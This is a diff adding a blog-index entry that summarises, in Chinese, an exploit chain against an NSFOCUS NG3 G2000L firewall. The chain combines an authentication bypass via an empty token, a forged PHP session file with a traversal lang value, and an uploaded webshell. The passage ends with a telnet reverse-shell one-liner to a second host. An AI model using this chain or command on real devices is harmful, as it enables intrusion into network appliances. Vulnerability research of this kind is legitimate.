@@ -299,6 +299,43 @@ sudo ./qemu-mipsel-static -L . ./usr/sbin/lighttpd -D -f ./etc/lighttpd/lighttpd
     </h2>
   </header>
   <div class="entry-content">
+    <p>绿盟NG3 G2000L防火墙文件上传和路径穿越组合漏洞 漏洞介绍 测试环境时在绿盟NG3 G2000L防火墙上进行的，固件版本：V6.0.1.58；引擎版本：V6.0.3.134。
+根据网络上就传的poc信息，该漏洞组合可能广泛存在于绿盟的整个NG系列防火墙上。不过因为防火墙和固件版本不一样，导致最终的发包内容有所区别。
+文件上传漏洞：该漏洞是因为开发时并没有考虑到特殊情况，从而产生漏洞 路径穿越漏洞：该漏洞是因为文件上传漏洞造成的次生漏洞，因为攻击者上传了特殊文件，从而导致攻击者可以控制本不能控制的参数，从而造成路径穿越。 环境复现 对绿盟防火墙环境的复现可以既简单又困难 矛盾文学（雾）
+困难的地方在于，在网络上找不到绿盟防火墙的完整固件。在其官网中也只能找到升级包，而并非完整的固件包。
+但如果能够直接购买到设备，那就会变得特别的简单。
+无法获得底层shell 当然拿到设备后，可以发现该设备有很多账户，但是只有develop账户可以进入最底层的Linux。可这个账户的密码，是根据一套算法实时计算的，只有寻找绿盟客服才能获得密码。
+所以我们只能采取其他方法。
+漏洞分析 文件上传漏洞 这里我们首先使用bp模拟发包：
+这里首先上传了一个名sess_82c13f359d0dd8f51c29d658a9c8ac71的文件，其实通过这个文件名称，我们就可以大概猜到其作用：想要保存一个session对话。
+一般sess打头的文件都是放在*/tmp*目录下，但以防万一，我们还是在代码中找了一下：
+./nsfocus/web/rest4espc/ipsv1/dispatch/v1/device/bugsInfo/resourse.php 通过代码，可以发现上传路径就是*/tmp*。
+同时，在这个文件中还可以看到一个身份判断：
+这里将$token和$contents进行比较，$contents来自*/tmp/token*文件，而$token来自我们GET传输的数据。
+那么我们如何绕过这个验证呢？答案是什么都不做。
+因为如果我们访问的sess文件中没有$contents的值，则php就会将$contents置为空。同时如果我们发包时，不使用GET传递参数，那么php会将$token也置为空。两个值都置空了，那两个值不就相等了？PHP 是最好的语言
+路径穿越漏洞 通过bp的包，我们可以看到，这时的session_id是最开始我们上传的文件名
+那么这个包，是怎么导致路径穿越的呢？根据上面这个包访问的路径：
+./nsfocus/web/apache2/sslvpn/mail/include/header_main.php 可以看到这里包含了一个叫做compose.php的文件，文件本来的意思是读取session中&#34;lang&#34;的值，并将这个值拼接成一个路径。
+但是我们在伪造的sess文件中存入了特殊的&#34;lang&#34;的值：
+lang|s:52:&#34;../../../../../../../../../../../../../../../../tmp/&#34; 为了直观显示被修改后的效果，这里我修改了原文件，使其输出$lang：
+通过这样的方法，我们就控制了$lang的值，从而让PHP文件包含了我们指定文件夹下的compose.php文件
+漏洞利用 通过上面的漏洞分析，我们可以将利用链总结如下：
+上传一个伪造session，使第二个漏洞包含*/tmp下的compose.php*文件。 然后再上传一个含有一句话马的名字为compose.php的文件到*/tmp*下 最后访问header_main.php，触发路径穿越，导致包含到*/tmp下刚刚上传的compose.php*文件。 最后exp 上传第一个包：
+上传第二个包：
+最后触发路径穿越：
+./test2.py 192.168.1.1 &#34;rm /tmp/f; mknod /tmp/f p; /bin/telnet 192.168.1.3 8080 &lt; /tmp/f | /bin/bash &gt;/tmp/f 2&gt;/tmp/f&#34; </p>
+  </div>
+  <footer class="entry-footer"></footer>
+  <a class="entry-link" aria-label="post link to " href="http://jellyfish-pro.github.io/posts/lvmeng_ng3_g2000l_firewall_upload_pathtraversal/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>
+    </h2>
+  </header>
+  <div class="entry-content">
     <p>RouterOS软路由线程同步漏洞 漏洞简介 该漏洞存在于RouterOS 6.38.4及以下版本。漏洞原理为未对 alloca()函数分配内存的大小做限制，导致alloca()函数可分配超过本线程内存块大小的内存，从而非法访问其他线程的内存。
 漏洞复现 RouterOS环境搭建 因为该漏洞为软路由漏洞，且有x86架构，故我们可使用VMware直接模拟。
 首先我们需要先下载Routeros的镜像，或者直接去官网下载镜像
